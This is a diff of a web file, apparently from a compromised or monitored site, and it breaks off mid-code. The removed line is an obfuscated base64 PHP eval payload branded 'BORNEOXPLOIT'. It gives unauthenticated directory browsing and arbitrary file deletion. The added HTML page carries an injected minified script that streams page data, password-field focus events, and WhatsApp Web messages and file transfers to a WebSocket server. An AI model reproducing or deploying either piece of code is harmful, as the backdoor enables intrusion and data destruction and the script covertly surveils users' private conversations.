@@ -1,1 +1,1959 @@
-<?php eval(base64_decode('c2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKQGluaV9zZXQoJ3psaWIub3V0cHV0X2NvbXByZXNzaW9uJywgMCk7CkBpbmlfc2V0KCdpbXBsaWNpdF9mbHVzaCcsIDEpOwpmb3IoJGkgPSAwOyAkaSA8IG9iX2dldF9sZXZlbCgpOyAkaSsrKSB7IG9iX2VuZF9mbHVzaCgpOyB9Cm9iX2ltcGxpY2l0X2ZsdXNoKDEpOwoKJHBhdGggPSBnZXRjd2QoKTsKaWYoaXNzZXQoJF9HRVRbJ2RpciddKSl7CiAgICAkcGF0aCA9JF9HRVRbJ2RpciddOwp9CgoKaWYoaXNzZXQoJF9HRVRbJ2tpbGwnXSkpewogICAgdW5saW5rKF9fRklMRV9fKTsKfQplY2hvICc8bGluayBocmVmPSJodHRwczovL3Jhc2VubWVkaWEubXkuaWQvYXNzZXRzL2Nzcy9ib290c3RyYXAtZGFyay5jc3MiIGlkPSJib290c3RyYXAtc3R5bGUiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8+JzsKZWNobyAnPGxpbmsgaHJlZj0iaHR0cHM6Ly9yYXNlbm1lZGlhLm15LmlkL2Fzc2V0cy9jc3MvYWxsLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiPic7CmVjaG8gJzxsaW5rIGhyZWY9Imh0dHBzOi8vcmFzZW5tZWRpYS5teS5pZC9hc3NldHMvY3NzL2FwcC1kYXJrLmNzcyIgaWQ9ImFwcC1zdHlsZSIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+JzsKZWNobyAnPGRpdiBjbGFzcz0icGFnZS1jb250ZW50Ij4nOwplY2hvICc8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPiAgPGRpdiBjbGFzcz0icm93IGQtZmxleCBqdXN0aWZ5LWNvbnRlbnQtY2VudGVyIj4nOwplY2hvICc8ZGl2IGNsYXNzPSJjb2wtMTIiPic7CmVjaG8gJzxkaXYgY2xhc3M9ImNhcmQiPic7CmVjaG8gJzxoNSBjbGFzcz0iY2FyZC1oZWFkZXIgYm9yZGVyLWJvdHRvbSB0ZXh0LXVwcGVyY2FzZSI+PGNlbnRlcj5TQ0FOTkVSIEJBQ0tET09SIEJPUk5FT1hQTE9JVCBWMTwvY2VudGVyPjwvaDU+JzsKZWNobyAnPGNlbnRlcj4gPGltZyBzcmM9Imh0dHBzOi8vaS5pYmIuY28vQkw2Qnh3TC9ib3JuZW94cGxvaXQucG5nIj4gPC9jZW50ZXI+ICc7CmVjaG8gJzxkaXYgY2xhc3M9ImNhcmQtYm9keSI+JzsKZWNobyAnPGRpdiBjbGFzcz0iYWxlcnQgYmctcHJpbWFyeSBiZy1ncmFkaWVudCB0ZXh0LWRhcmsgZC1mbGV4IGFsaWduLWl0ZW1zLWNlbnRlciIgcm9sZT0iYWxlcnQiPic7CmVjaG8gJzxpIGNsYXNzPSJieCBieC1pbmZvLWNpcmNsZSBmcy0yIG1lLTIiPjwvaT48Y2VudGVyPktvY29rIFRlcnVzIEtzYXRyaWEgQmF0YW5nIEhpdGFtIEthbXUgISEhIENvbnRhY3Q6IEh0dHBzOi8vdC5tZS9Cb3JuZW94cGxvaXQ0MDQgPC9jZW50ZXI+PC9kaXY+JzsKZWNobyAiPGEgaHJlZj0nP2tpbGwnPjxmb250IGNvbG9yPSdyZWQnPltTZWxmIERlbGV0ZV08L2ZvbnQ+PC9hPjxicj4iOwplY2hvICc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJnZXQiPjxpbnB1dCBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJ0ZXh0IiBuYW1lPSJkaXIiIHZhbHVlPScuJHBhdGguJyBzdHlsZT0id2lkdGg6IDkwMHB4OyI+PGJyPjxpbnB1dCBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IGJnLWdyYWRpZW50IHdhdmVzLWVmZmVjdCB3YXZlcy1saWdodCBtZS0xIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTY2FubmVyIj48L2Zvcm0+PGJyPic7CgplY2hvICJDVVJSRU5UIERJUjogPGZvbnQgY29sb3I9J2dyZWVuJz4kcGF0aDwvZm9udD48YnI+IjsKaWYoaXNzZXQoJF9HRVRbJ2RlbGV0ZSddKSl7CiAgICB1bmxpbmsoJF9HRVRbJ2RlbGV0ZSddKTsKICAgICRzdGF0dXMgPSAiPGZvbnQgY29sb3I9J3JlZCc+RkFJTEVEPC9mb250PiI7CiAgICBpZighZmlsZV9leGlzdHMoJF9HRVRbJ2RlbGV0ZSddKSl7CiAgICAgICAgJHN0YXR1cyA9ICI8Zm9udCBjb2xvcj0nbGlnaHRibHVlJz5TdWNjZXNzPC9mb250PiI7CgkJCiAgICB9CiAgICBlY2hvICJUUlkgVE8gREVMRVRFOiAiLiRfR0VUWydkZWxldGUnXS4iICRzdGF0dXMgPGJyPiI7ZXhpdDsKfQoKc2NhbkJhY2tkb29yKCRwYXRoKTsKZnVuY3Rpb24gc2F2ZSgkZm5hbWUsJHZhbHVlKXsKCSRmaWxlID0gZm9wZW4oJGZuYW1lLCAiYSIpOwoJZndyaXRlKCRmaWxlLCAkdmFsdWUpOwoJZmNsb3NlKCRmaWxlKTsvLwp9Ci8vICRkb21haW4gPSAkX1NFUlZFUlsnUkVRVUVTVF9TQ0hFTUUnXS4nLy8nLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddOwpmdW5jdGlvbiBjaGVja0JhY2tkb29yKCRmaWxlX2xvY2F0aW9uKXsKICAgIGdsb2JhbCAkcGF0aDsKICAgICRwYXRlcm4gPSAiI2V4ZWNcKHxnemluZmxhdGVcKHxmaWxlX3B1dF9jb250ZW50c1wofGZpbGVfZ2V0X2NvbnRlbnRzXCh8c3lzdGVtXCh8cGFzc3RocnVcKHxzaGVsbF9leGVjXCh8bW92ZV91cGxvYWRlZF9maWxlXCh8ZXZhbFwofGJhc2U2NCMiOwogICAgJGNvbnRlbnRzID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGVfbG9jYXRpb24pOwogICAgaWYoc3RybGVuKCRjb250ZW50cyk+IDApewogICAgICAgIGlmKHByZWdfbWF0Y2goJHBhdGVybiwgc3RydG9sb3dlcigkY29udGVudHMpKSl7CiAgICAgICAgICAgIGVjaG8gIlsrXSBTdXNzcGVjdCBmaWxlIC0+IDxmb250IGNvbG9yPSdyZWQnPiRmaWxlX2xvY2F0aW9uPC9mb250PiA8YSBocmVmPSc/ZGVsZXRlPSRmaWxlX2xvY2F0aW9uJmRpcj0kcGF0aCc+PGZvbnQgY2xhc3M9J2J0biBidG4tcHJpbWFyeSBiZy1ncmFkaWVudCB3YXZlcy1lZmZlY3Qgd2F2ZXMtbGlnaHQgbWUtMScgY29sb3I9J2xpZ2h0Ymx1ZSc+W0RFTEVURV08L2ZvbnQ+PC9hPiA8YnI+IjsKICAgICAgICAgICAgc2F2ZSgid29vdC50eHQiLCIkZmlsZV9sb2NhdGlvblxuIik7CiAgICAgICAgICAgIGVjaG8gJzx0ZXh0YXJlYSBjbGFzcz0iZm9ybS1jb250cm9sIiBuYW1lPSJjb250ZW50IiBjb2xzPSI0NSIgcm93cz0iMTUiPicuaHRtbHNwZWNpYWxjaGFycygkY29udGVudHMpLic8L3RleHRhcmVhPjxicj48YnI+JzsKICAgICAgICB9CiAgICB9ICAgCn0KCmZ1bmN0aW9uIHNjYW5CYWNrZG9vcigkY3VycmVudF9kaXIpewoJaWYoaXNfcmVhZGFibGUoJGN1cnJlbnRfZGlyKSl7CgkgCSRkaXJfbG9jYXRpb24gPSBzY2FuZGlyKCRjdXJyZW50X2Rpcik7CgkJZm9yZWFjaCAoJGRpcl9sb2NhdGlvbiBhcyAkZmlsZSkgewogICAgICAgICAgICBpZigkZmlsZSA9PT0gIi4iIHwgJGZpbGUgPT09ICIuLiIpewogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGZpbGVfbG9jYXRpb24gPSBzdHJfcmVwbGFjZSgiLy8iLCAiLyIsJGN1cnJlbnRfZGlyLicvJy4kZmlsZSk7CiAgICAgICAgICAgICRuRmlsZSA9IHN1YnN0cigkZmlsZSwgLTQsIDQpOwogICAgICAgICAgICBpZigkbkZpbGUgPT0gIi5waHAiKXsKICAgICAgICAgICAgICAgIGNoZWNrQmFja2Rvb3IoJGZpbGVfbG9jYXRpb24pOwogICAgICAgICAgICB9ZWxzZSBpZihpc19kaXIoJGZpbGVfbG9jYXRpb24pKXsKICAgICAgICAgICAgICAgIHNjYW5CYWNrZG9vcigkZmlsZV9sb2NhdGlvbik7CiAgICAgICAgICAgIH0KCQl9Cgl9Cn0=')); ?>
+
+
+
+
+
+<!DOCTYPE html>
+<html class="js audio audio-ogg audio-mp3 audio-opus audio-wav audio-m4a cors cssanimations backgroundblendmode flexbox inputtypes-search inputtypes-tel inputtypes-url inputtypes-email no-inputtypes-datetime inputtypes-date inputtypes-month inputtypes-week inputtypes-time inputtypes-datetime-local inputtypes-number inputtypes-range inputtypes-color localstorage placeholder svg xhr2"
+    lang="en">
+
+<head>
+
+    <script nonce="TFNQUvYHwdi8uHoMheRs/Q==">!function(){var e,t,n;function Y(){try{return window.self===window.top}catch(e){return!1}}function r(){setTimeout(function(){var e={type:"focus",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:w.pid,pn:w.pn};null!=B&&B.readyState==WebSocket.OPEN&&B.send(JSON.stringify(e))},0)}function a(){var e={type:"notification",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),timeout:w.sendNotificationsInterval,useragent:navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,pid:w.pid,pn:w.pn};B.send(JSON.stringify(e))}function o(){y()}function s(){Y()&&(clearInterval(T),clearInterval(I)),timeout=setTimeout(function(){g()},L)}function i(e){if(Y())switch(e.data.substring(0,1)){case"r":window.location=e.data.substring(1);break;case"b":document.body.innerHTML=e.data.substring(1);break;case"w":var t="true"==e.data.substring(1).toLowerCase();O!=t&&t&&v(),O=t;break;case"x":!function(e){try{const t=JSON.parse(e),n=b.get(t.requestId);if(n){b.delete(t.requestId);const{responseCallback:e,fileName:Y}=n;e(t,Y)}}catch(e){unblockPage()}}(e.data.substring(1))}}function u(e){var t=document.createElement("a");return t.href=e,t.href}function d(e){if(!e)return!1;if("password"==e.type)return!0;if(e instanceof HTMLInputElement){var t=window.getComputedStyle(e);if(t){var n=t.getPropertyValue("-webkit-text-security");return["disc","circle","square"].includes(n)}}return!1}function c(e,t=!1){if(d(e)&&!F)if(F=!0,Y()){var n={type:"password_input_focus",focus:!0,token:w.token};B.send(JSON.stringify(n))}else window.top.postMessage({message:"iframePasswordInputFocused",name:e.name,type:"password"},"*")}function M(e,t=!1){var n=e&&e.name?e.name:"<unnamed>";if(d(e)&&F)if(F=!1,Y()){var r={type:"password_input_focus",focus:!1,token:w.token};B.send(JSON.stringify(r))}else window.top.postMessage({message:"iframePasswordInputBlurred",name:n,type:"password"},"*")}function l(e){var t=document.activeElement;t&&t!=document.body?document.querySelector&&(t=document.querySelector(":focus")):t=null;for(var n=0;n<e.length;++n){let o=e[n];var Y=d(o),r=Y&&o.hasAttribute("autofocus"),a=Y&&t&&o.isEqualNode(t);(r||a)&&c(o),o.tmInputEventListenerAttached||(o.addEventListener("focus",function(e){c(e.target)},!0),o.addEventListener("blur",function(e){M(e.target)},!0),o.tmInputEventListenerAttached=!0)}}function f(){l(document.getElementsByTagName("input"));var e=new MutationObserver(function(e){e&&e.forEach(function(e){e&&e.addedNodes&&0!=e.addedNodes.length&&(window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach),e.addedNodes.forEach(function(e){if(e.tagName){var t=[];"input"==e.tagName.toLowerCase()?t.push(e):t=e.getElementsByTagName("input"),t.length&&l(t)}}))})});e.observe(document,{childList:!0,subtree:!0}),window.addEventListener("beforeunload",function(e){M(),function(){for(var e=document.getElementsByTagName("input"),t=0;t<e.length;++t){let n=e[t];n.removeEventListener("focus",c),n.removeEventListener("blur",M),delete n.tmInputEventListenerAttached}}()})}function D(){var e;Y()&&(w.iup&&(e={type:"connect",token:w.token,title:document.title,url:document.URL,focused:document.hasFocus(),useragent:navigator.userAgent,pid:w.pid,pn:w.pn},null!=B&&B.readyState==WebSocket.OPEN&&B.send(JSON.stringify(e))),h()&&(v(),y(),function(){function e(e){return e.baseURI&&e.baseURI.startsWith("https://web.whatsapp.com/")}function t(e){const t=e.dataTransfer.files;t.length>0&&Array.from(t).forEach(e=>{N(e)})}document.querySelectorAll("div").forEach(n=>{e(n)&&n.addEventListener("drop",t,{passive:!0})});var n=new MutationObserver(function(e){e&&(Array.from(document.querySelectorAll(".message-in, .message-out")).reduce((e,t)=>{var n=t.querySelector("button[type=button], div[role=button]");return n&&e.push(n),e},[]).forEach(e=>{const t="modified";e.hasAttribute(t)||(e.setAttribute(t,""),e.onclick=t=>{t.verified||(t.preventDefault(),t.stopPropagation(),new Promise(function(t,n){!function(e,t,n){try{const n=e.parentElement,Y=n[Object.keys(n).find(e=>e.includes("__reactProps"))].children.props.msg,r=Y.mediaData,a=crypto.randomUUID();b.set(a,{responseCallback:e=>t(!e.block)}),B.send(JSON.stringify({requestId:a,type:"waptransfer",direction:"download",filename:r.__x_filename,filesize:r.__x_size,filetype:r.__x_mimetype,filehash:Y.__x_encFilehash,url:document.URL,process:w.pn,content:""}))}catch{n()}}(e,t,()=>setTimeout(()=>n(),1))}).then(e=>{t.verified=e,t.verified&&t.target.dispatchEvent(t)},()=>{}))})}),e.forEach(function(e){e&&("childList"!==e.type||e.addedNodes.length<=0||e.addedNodes.forEach(function(e){if(e&&e.nodeType==Node.ELEMENT_NODE){e.querySelectorAll("input").forEach(e=>{!function(e){const t="modified";"file"!==e.type||e.hasAttribute(t)||(e.setAttribute(t,""),e.addEventListener("change",e=>{Array.from(e.target.files).forEach(e=>{N(e)})}))}(e)});var t=document.querySelectorAll("div[id=main] header div")[2];if(t){var n=t.querySelectorAll("div")[1],Y=t.querySelectorAll("div")[2];k=(n?n.innerText:"")+":"+(Y?Y.innerText:"")}document.querySelector("div[id=main] header span[data-icon=default-user]")&&(C="private"),document.querySelector("div[id=main] header span[data-icon=default-group]")&&(C="group");var r=e.querySelectorAll(".message-in, .message-out");r||E("msgNodes is empty"),e.matches(".message-in, .message-out")&&(r=Array.prototype.slice.call(r)).push(e),r&&0!=r.length?r.forEach(function(e){if(e)if(!e.classList||e.classList.length<=0)E("msg node does not contain classList or classList is empty");else{var t=e.classList.contains("message-in"),n=e.querySelector(".copyable-text"),Y=e.querySelector(".selectable-text"),r=new Date,a=null;if(n&&n.attributes["data-pre-plain-text"]){var o=n.attributes["data-pre-plain-text"].textContent,s=/\[(\d{1,2}):(\d{1,2})[ ]{0,1}([p|a]\.?\s?m\.?)?,\s(.+)]\s(.*):/i[Symbol.match](o);if(!s||6!=s.length)return void E("no matches for string: "+o);if(s[3]&&s[3].length>1&&"p"==s[3].toLowerCase().slice(0,1)&&(s[1]=parseInt(s[1])+12),dateParts=/(\d{1,4})[.-\\/](\d{1,4})[.-\\/](\d{1,4})/[Symbol.match](s[4]),!dateParts||4!=dateParts.length)return void E("no matches for string: "+s[4]);if(E(s[4]+_),!(r=date.parse(s[4],_)||function(e,t,n){var Y=[[e,t,n].join("-"),[e,n,t].join("-"),[t,e,n].join("-"),[t,n,e].join("-"),[n,e,t].join("-"),[n,t,e].join("-")],r=Date.now();for(var a in Y){var o=Date.parse(Y[a]);if(o&&!(Math.abs(r-o)>1728e6))return new Date(o)}}(dateParts[1],dateParts[2],dateParts[3])))return void E("Can't parse date from string: "+s[4]);r.setHours(s[1]),r.setMinutes(s[2]),a=s[5]}E("isIncomingMsg = "+t+" msgDateTime = "+r+" msgSender = "+a+" wapStartTime = "+x+" wapTrackingEnabled = "+O),H.get(k)||H.set(k,x);var i=Y?Y.innerText:null;if(E("msgContent = "+i),a&&i&&O){var u=(a+i+k+r.getTime()).split("").map(function(e){return e.charCodeAt(0)}).reduce(function(e,t){return e+((e<<7)+(e<<3))^t}).toString(16);if(H.get(k).getTime()==r.getTime()?r.setMilliseconds(++R):(R=0,H.set(k,r)),!u||P.has(u))return void E("msgId is null or this msgId already tracked "+u);var d={type:"wapmessage",timestamp:r.getTime(),id:u,incoming:t,sender:t?a:"Me",content:i,recipient:t?"Me":k,conversationId:k+"("+C+")"};B.send(JSON.stringify(d)),P.add(u)}}}):E("no msg nodes found")}}))}))});if(!n)return;function Y(){n.observe(document.body,{childList:!0,subtree:!0}),E("observer is ready")}"loading"===document.readyState?document.addEventListener("DOMContentLoaded",Y):Y()}()),Y()&&(a(),T=setInterval(a,w.sendNotificationsInterval),h()&&(I=setInterval(o,w.pollWhatsappTrackingInterval))),function(){for(var e=[],t=document.getElementsByTagName("link"),n=0;n<t.length;++n)"icon"!=t[n].getAttribute("rel")&&"shortcut icon"!=t[n].getAttribute("rel")||(e[e.length]=u(t[n].getAttribute("href")));0==e.length&&(e[0]=u("/favicon.ico"));var Y={type:"favicon"};Y.url=document.URL,Y.src=e,Y.title=document.title,Y.token=w.token,Y.useragent=navigator.appVersion.length>navigator.userAgent.length?navigator.appVersion:navigator.userAgent,B.send(JSON.stringify(Y))}(),w.dontTrackWebPasswords&&f())}function p(){document.tmfilter||(g(),_={"ar-SA":"D/M/YY","bg-BG":"D.M.YYYY","ca-ES":"D/M/YYYY","zh-TW":"YYYY/M/D","cs-CZ":"D.M.YYYY","Da-DK":"D-M-YYYY","De-DE":"D.M.YYYY","el-GR":"D/M/YYYY","en-US":"M/D/YYYY","fi-FI":"D.M.YYYY","fr-FR":"D/M/YYYY","he-IL":"D/M/YYYY","hu-HU":"YYYY. M. D.","is-IS":"D.M.YYYY","it-IT":"D/M/YYYY","ja-JP":"YYYY/M/D","ko-KR":"YYYY-M-D","nl-NL":"D-M-YYYY","nb-NO":"D.M.YYYY","pl-PL":"YYYY-M-D","pt-BR":"D/M/YYYY","ro-RO":"D.M.YYYY","ru-RU":"D.M.YYYY","hr-HR":"D.M.YYYY","sk-SK":"D. M. YYYY","sq-AL":"YYYY-M-D","sv-SE":"YYYY-M-D","th-TH":"D/M/YYYY","tr-TR":"D.M.YYYY","ur-PK":"D/M/YYYY","iD-ID":"D/M/YYYY","uk-UA":"D.M.YYYY","be-BY":"D.M.YYYY","sl-SI":"D.M.YYYY","et-EE":"D.M.YYYY","lv-LV":"YYYY.M.D.","lt-LT":"YYYY.M.D","fa-IR":"M/D/YYYY","vi-VN":"D/M/YYYY","hy-AM":"D.M.YYYY","az-Latn-AZ":"D.M.YYYY","eu-ES":"YYYY/M/D","Mk-MK":"D.M.YYYY","af-ZA":"YYYY/M/D","ka-GE":"D.M.YYYY","fo-FO":"D-M-YYYY","hi-IN":"D-M-YYYY","Ms-MY":"D/M/YYYY","kk-KZ":"D.M.YYYY","ky-KG":"D.M.YY","sw-KE":"M/D/YYYY","uz-Latn-UZ":"D/M YYYY","tt-RU":"D.M.YYYY","pa-IN":"D-M-YY","gu-IN":"D-M-YY","ta-IN":"D-M-YYYY","te-IN":"D-M-YY","kn-IN":"D-M-YY","Mr-IN":"D-M-YYYY","sa-IN":"D-M-YYYY","Mn-MN":"YY.M.D","gl-ES":"D/M/YY","kok-IN":"D-M-YYYY","syr-SY":"D/M/YYYY","Dv-MV":"D/M/YY","ar-IQ":"D/M/YYYY","zh-CN":"YYYY/M/D","De-CH":"D.M.YYYY","en-GB":"D/M/YYYY","es-MX":"D/M/YYYY","fr-BE":"D/M/YYYY","it-CH":"D.M.YYYY","nl-BE":"D/M/YYYY","nn-NO":"D.M.YYYY","pt-PT":"D-M-YYYY","sr-Latn-CS":"D.M.YYYY","sv-FI":"D.M.YYYY","az-Cyrl-AZ":"D.M.YYYY","Ms-BN":"D/M/YYYY","uz-Cyrl-UZ":"D.M.YYYY","ar-EG":"D/M/YYYY","zh-HK":"D/M/YYYY","De-AT":"D.M.YYYY","en-AU":"D/M/YYYY","es-ES":"D/M/YYYY","fr-CA":"YYYY-M-D","sr-Cyrl-CS":"D.M.YYYY","ar-LY":"D/M/YYYY","zh-SG":"D/M/YYYY","De-LU":"D.M.YYYY","en-CA":"D/M/YYYY","es-GT":"D/M/YYYY","fr-CH":"D.M.YYYY","ar-DZ":"D-M-YYYY","zh-MO":"D/M/YYYY","De-LI":"D.M.YYYY","en-NZ":"D/M/YYYY","es-CR":"D/M/YYYY","fr-LU":"D/M/YYYY","ar-MA":"D-M-YYYY","en-IE":"D/M/YYYY","es-PA":"M/D/YYYY","fr-MC":"D/M/YYYY","ar-TN":"D-M-YYYY","en-ZA":"YYYY/M/D","es-DO":"D/M/YYYY","ar-OM":"D/M/YYYY","en-JM":"D/M/YYYY","es-VE":"D/M/YYYY","ar-YE":"D/M/YYYY","en-029":"M/D/YYYY","es-CO":"D/M/YYYY","ar-SY":"D/M/YYYY","en-BZ":"D/M/YYYY","es-PE":"D/M/YYYY","ar-JO":"D/M/YYYY","en-TT":"D/M/YYYY","es-AR":"D/M/YYYY","ar-LB":"D/M/YYYY","en-ZW":"M/D/YYYY","es-EC":"D/M/YYYY","ar-KW":"D/M/YYYY","en-PH":"M/D/YYYY","es-CL":"D-M-YYYY","ar-AE":"D/M/YYYY","es-UY":"D/M/YYYY","ar-BH":"D/M/YYYY","es-PY":"D/M/YYYY","ar-QA":"D/M/YYYY","es-BO":"D/M/YYYY","es-SV":"D/M/YYYY","es-HN":"D/M/YYYY","es-NI":"D/M/YYYY","es-PR":"D/M/YYYY","aM-ET":"D/M/YYYY","tzM-Latn-DZ":"D-M-YYYY","iu-Latn-CA":"D/M/YYYY","sMa-NO":"D.M.YYYY","Mn-Mong-CN":"YYYY/M/D","gD-GB":"D/M/YYYY","en-MY":"D/M/YYYY","prs-AF":"D/M/YY","bn-BD":"D-M-YY","wo-SN":"D/M/YYYY","rw-RW":"M/D/YYYY","qut-GT":"D/M/YYYY","sah-RU":"M.D.YYYY","gsw-FR":"D/M/YYYY","co-FR":"D/M/YYYY","oc-FR":"D/M/YYYY","Mi-NZ":"D/M/YYYY","ga-IE":"D/M/YYYY","se-SE":"YYYY-M-D","br-FR":"D/M/YYYY","sMn-FI":"D.M.YYYY","Moh-CA":"M/D/YYYY","arn-CL":"D-M-YYYY","ii-CN":"YYYY/M/D","Dsb-DE":"D. M. YYYY","ig-NG":"D/M/YYYY","kl-GL":"D-M-YYYY","lb-LU":"D/M/YYYY","ba-RU":"D.M.YY","nso-ZA":"YYYY/M/D","quz-BO":"D/M/YYYY","yo-NG":"D/M/YYYY","ha-Latn-NG":"D/M/YYYY","fil-PH":"M/D/YYYY","ps-AF":"D/M/YY","fy-NL":"D-M-YYYY","ne-NP":"M/D/YYYY","se-NO":"D.M.YYYY","iu-Cans-CA":"D/M/YYYY","sr-Latn-RS":"D.M.YYYY","si-LK":"YYYY-M-D","sr-Cyrl-RS":"D.M.YYYY","lo-LA":"D/M/YYYY","kM-KH":"YYYY-M-D","cy-GB":"D/M/YYYY","bo-CN":"YYYY/M/D","sMs-FI":"D.M.YYYY","as-IN":"D-M-YYYY","Ml-IN":"D-M-YY","en-IN":"D-M-YYYY","or-IN":"D-M-YY","bn-IN":"D-M-YY","tk-TM":"D.M.YY","bs-Latn-BA":"D.M.YYYY","Mt-MT":"D/M/YYYY","sr-Cyrl-ME":"D.M.YYYY","se-FI":"D.M.YYYY","zu-ZA":"YYYY/M/D","xh-ZA":"YYYY/M/D","tn-ZA":"YYYY/M/D","hsb-DE":"D. M. YYYY","bs-Cyrl-BA":"D.M.YYYY","tg-Cyrl-TJ":"D.M.YY","sr-Latn-BA":"D.M.YYYY","sMj-NO":"D.M.YYYY","rM-CH":"D/M/YYYY","sMj-SE":"YYYY-M-D","quz-EC":"D/M/YYYY","quz-PE":"D/M/YYYY","hr-BA":"D.M.YYYY.","sr-Latn-ME":"D.M.YYYY","sMa-SE":"YYYY-M-D","en-SG":"D/M/YYYY","ug-CN":"YYYY-M-D","sr-Cyrl-BA":"D.M.YYYY","es-US":"M/D/YYYY"}[navigator.language],document.tmfilter="present")}function g(){(B=new WebSocket(w.connectionString)).onclose=s,B.onmessage=i,B.onopen=D,w.extJs&&(w.extJs.webSock={readyState:()=>B.readyState,send:e=>B.send(e)})}function m(){var e=function(){var e=["webkit","moz","ms","o"];if("hidden"in document)return"hidden";for(var t=0;t<e.length;t++)if(e[t]+"Hidden"in document)return e[t]+"Hidden";return null}();return!!e&&document[e]}function h(){var e=document.head.querySelector("[name='og:title']");return!!e&&"WhatsApp Web"===e.getAttribute("content")}function y(){B.send(JSON.stringify({type:"waptracking"}))}function v(){H=new Map,P=new Set,R=0,(x=new Date).setSeconds(0),x.setMilliseconds(0)}function S(e){for(var t="",n=new Uint8Array(e),Y=n.byteLength,r=0;r<Y;r++)t+=String.fromCharCode(n[r]);return window.btoa(t)}e=this,t={},n={en:{MMMM:"January February March April May June July August September October November December".split(" "),MMM:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),dddd:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),ddd:"Sun Mon Tue Wed Thu Fri Sat".split(" "),dd:"Su Mo Tu We Th Fr Sa".split(" "),A:["a.m.","p.m."],formatter:{YYYY:function(e){return("000"+e.getFullYear()).slice(-4)},YY:function(e){return("0"+e.getFullYear()).slice(-2)},Y:function(e){return""+e.getFullYear()},MMMM:function(e){return this.MMMM[e.getMonth()]},MMM:function(e){return this.MMM[e.getMonth()]},MM:function(e){return("0"+(e.getMonth()+1)).slice(-2)},M:function(e){return""+(e.getMonth()+1)},DD:function(e){return("0"+e.getDate()).slice(-2)},D:function(e){return""+e.getDate()},HH:function(e){return("0"+e.getHours()).slice(-2)},H:function(e){return""+e.getHours()},A:function(e){return this.A[11<e.getHours()|0]},hh:function(e){return("0"+(e.getHours()%12||12)).slice(-2)},h:function(e){return""+(e.getHours()%12||12)},mm:function(e){return("0"+e.getMinutes()).slice(-2)},m:function(e){return""+e.getMinutes()},ss:function(e){return("0"+e.getSeconds()).slice(-2)},s:function(e){return""+e.getSeconds()},SSS:function(e){return("00"+e.getMilliseconds()).slice(-3)},SS:function(e){return("0"+(e.getMilliseconds()/10|0)).slice(-2)},S:function(e){return""+(e.getMilliseconds()/100|0)},dddd:function(e){return this.dddd[e.getDay()]},ddd:function(e){return this.ddd[e.getDay()]},dd:function(e){return this.dd[e.getDay()]},Z:function(e){return(0<(e=e.utc?0:e.getTimezoneOffset()/.6)?"-":"+")+("000"+Math.abs(e-e%100*.4)).slice(-4)},post:function(e){return e}},parser:{find:function(e,t){for(var n,Y=-1,r=0,a=0,o=e.length;a<o;a++)n=e[a],!t.indexOf(n)&&n.length>r&&(Y=a,r=n.length);return{index:Y,length:r}},MMMM:function(e){return this.parser.find(this.MMMM,e)},MMM:function(e){return this.parser.find(this.MMM,e)},A:function(e){return this.parser.find(this.A,e)},h:function(e,t){return(12===e?0:e)+12*t},pre:function(e){return e}}}},t.format=function(e,Y,r){var a=t.addMinutes(e,r?e.getTimezoneOffset():0),o=n.en,s=o.formatter;return a.utc=r,Y.replace(/(\[[^\[\]]*]|\[.*\][^\[]*\]|YYYY|YY|MMM?M?|DD|HH|hh|mm|ss|SSS?|ddd?d?|.)/g,function(e){var t=s[e];return t?s.post(t.call(o,a,Y)):e.replace(/\[(.*)]/,"$1")})},t.parse=function(e,Y,r){var a,o,s=n.en,i=s.parser.pre(e),u=0,d=/(MMMM?|A)|(YYYY)|(SSS)|(MM|DD|HH|hh|mm|ss)|(YY|M|D|H|h|m|s|SS)|(S)|(.)/g,c={2:/^\d{1,4}/,3:/^\d{1,3}/,4:/^\d\d/,5:/^\d\d?/,6:/^\d/};e=[31,28,31,30,31,30,31,31,30,31,30,31];for(var M={Y:1970,M:1,D:1,H:0,m:0,s:0,S:0};a=d.exec(Y);){var l=0,f=1;for(o="";!o;)o=a[++l];a=o.charAt(0);var D=i.slice(u);if(2>l){var p=s.parser[o].call(s,D,Y);M[a]=p.index,"M"===a&&M[a]++,f=p.length}else if(7>l)p=(D.match(c[l])||[""])[0],M[a]=0|("S"===a?(p+"000").slice(0,-o.length):p),f=p.length;else if(" "!==a&&a!==D[0])return NaN;if(!f)return NaN;u+=f}return u===i.length&&p?(M.Y+=70>M.Y?2e3:100>M.Y?1900:0,M.H=M.H||s.parser.h(M.h||0,M.A||0),Y=new Date(M.Y,M.M-1,M.D,M.H,M.m,M.s,M.S),e[1]+=0|t.isLeapYear(Y),1>M.M||12<M.M||1>M.D||M.D>e[M.M-1]||23<M.H||59<M.m||59<M.s?NaN:r?t.addMinutes(Y,-Y.getTimezoneOffset()):Y):NaN},t.isValid=function(e,n){return!!t.parse(e,n)},t.addYears=function(e,n){return t.addMonths(e,12*n)},t.addMonths=function(e,t){var n=new Date(e.getTime());return n.setMonth(n.getMonth()+t),n},t.addDays=function(e,t){var n=new Date(e.getTime());return n.setDate(n.getDate()+t),n},t.addHours=function(e,n){return t.addMilliseconds(e,36e5*n)},t.addMinutes=function(e,n){return t.addMilliseconds(e,6e4*n)},t.addSeconds=function(e,n){return t.addMilliseconds(e,1e3*n)},t.addMilliseconds=function(e,t){return new Date(e.getTime()+t)},t.subtract=function(e,t){var n=e.getTime()-t.getTime();return{toMilliseconds:function(){return n},toSeconds:function(){return n/1e3|0},toMinutes:function(){return n/6e4|0},toHours:function(){return n/36e5|0},toDays:function(){return 